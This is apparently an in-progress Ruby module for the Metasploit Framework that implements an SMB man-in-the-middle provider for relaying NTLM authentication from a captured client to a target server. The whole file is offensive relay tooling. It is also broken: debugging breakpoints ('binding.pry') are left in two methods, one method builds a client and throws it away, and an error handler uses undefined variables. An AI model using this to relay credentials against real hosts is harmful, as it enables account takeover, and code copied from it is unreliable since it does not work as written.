require 'ruby_smb/ntlm'

module Msf
  module Exploit::Remote::SMB
    include ::Msf::Exploit::SMBHashCapture


    #
    # A GSS provider that authenticates clients via the passing of a hash to a specified remote host.
    #
    class RubySMBMITMProvider < ::Msf::Exploit::SMBHashCapture::HashCaptureNTLMProvider
      include RubySMB::NTLM

      class Authenticator < ::Msf::Exploit::SMBHashCapture::HashCaptureAuthenticator
        class MITMClient < ::RubySMB::Client
          def initialize(dispatcher, smb1: nil, smb2: nil, smb3: nil, username:, password:, domain: nil, local_workstation: nil, always_encrypt: nil, ntlm_flags: nil, provider: nil)
            super(dispatcher,
                  smb1: smb1,
                  smb2: smb2,
                  smb3: smb3,
                  username: username,
                  password: password,
                  domain: domain,
                  local_workstation: local_workstation,
                  always_encrypt: always_encrypt,
                  ntlm_flags: ntlm_flags)

            @provider = provider
          end


          # Overridden to return the packet and not the version
          def negotiate
            request_packet  = negotiate_request
            raw_response    = send_recv(request_packet)
            response_packet = negotiate_response(raw_response)
            # The list of dialect identifiers sent to the server is stored
            # internally to be able to retrieve the negotiated dialect later on.
            # This is only valid for SMB1.
            response_packet.dialects = request_packet.dialects if response_packet.respond_to? :dialects=
            version = parse_negotiate_response(response_packet)
            if @dialect == '0x0311'
              update_preauth_hash(request_packet)
              update_preauth_hash(response_packet)
            end

            # If the response contains the SMB2 wildcard revision number dialect;
            # it indicates that the server implements SMB 2.1 or future dialect
            # revisions and expects the client to send a subsequent SMB2 Negotiate
            # request to negotiate the actual SMB 2 Protocol revision to be used.
            # The wildcard revision number is sent only in response to a
            # multi-protocol negotiate request with the "SMB 2.???" dialect string.
            if @dialect == '0x02ff'
              self.smb2_message_id += 1
              version = negotiate
            end
            response_packet
          rescue RubySMB::Error::InvalidPacket, Errno::ECONNRESET, RubySMB::Error::CommunicationError => e
            version = request_packet.packet_smb_version
            version = 'SMB3' if version == 'SMB2' && !@smb2 && @smb3
            version = 'SMB2 or SMB3' if version == 'SMB2' && @smb2 && @smb3
            error = "Unable to negotiate #{version} with the remote host: #{e.message}"
            raise RubySMB::Error::NegotiationFailure, error
          end
        end

        def reset!
          super

          # Server that we are passing the hash to
          @server_connection = nil
        end

        #
        # Process the NTLM type 1 message and build a type 2 response message.
        #
        # @param [Net::NTLM::Message::Type1] type1_msg the NTLM type 1 message received by the client that should be
        #   processed
        # @return [Net::NTLM::Message::Type2] the NTLM type 2 response message with which to reply to the client
        def process_ntlm_type1(type1_msg)
          @server_connection = create_connection(@provider.peer_host, @provider.peer_port,
                                                 @provider.local_host, @provider.timeout, @provider.smb1)
          get_peer_server_challenge(@server_connection)

          type2_msg = super(type1_msg)

          require 'pry'
          binding.pry

          type2_msg
        end

        def create_connection(peer_host, peer_port, local_host, timeout, smb1)
          sock = Rex::Socket::Tcp.create(
            'LocalHost' => local_host,
            'PeerHost' => peer_host,
            'PeerPort' => peer_port,
            'Server' => false,
            'Timeout' => timeout,
            'Context' =>
              {
                'Msf' => framework,
                'MsfExploit' => self
              }
          )

          dispatcher = RubySMB::Dispatcher::Socket.new(sock)

          MITMClient.new(dispatcher, smb1: smb1, provider: self, username: nil, password: nil)

          sock
        rescue Exception => e
          msg = "Unable to create connection to server #{peer_host}:#{peer_port} on local interface #{local_host}."
          elog(msg, error: e)
          print_warning msg
        end

        def get_peer_server_challenge(conn)
          resp_pkt = conn.negotiate

          require 'pry'
          binding.pry

          resp_pkt.server_challenge
        rescue Exception => e
          msg = "Unable to retrieve server challenge at #{peer_host}:#{peer_port} on local interface #{local_host}."
          elog(msg, error: e)
          print_warning msg
        end

      end

      def initialize(opts)
        raise ArgumentError, 'Must specify a peer_host' unless opts[:peer_host]
        raise ArgumentError, 'Must specify a peer_port' unless opts[:peer_port]
        raise ArgumentError, 'Must specify a local_host' unless opts[:local_host]
        super(allow_anonymous: opts[:allow_anonymous], default_domain: opts[:default_domain], listener: opts[:listener])

        @peer_host = opts[:peer_host]
        @peer_port = opts[:peer_port]
        @local_host = opts[:local_host]
        @timeout = opts[:timeout] ? opts[:timeout] : 3
        @smb1 = opts[:smb1] ? opts[:smb1] : false
      end

      def new_authenticator(server_client)
        # build and return an instance that can process and track stateful information for a particular connection but
        # that's backed by this particular provider
        Authenticator.new(self, server_client)
      end
    end
  end
end
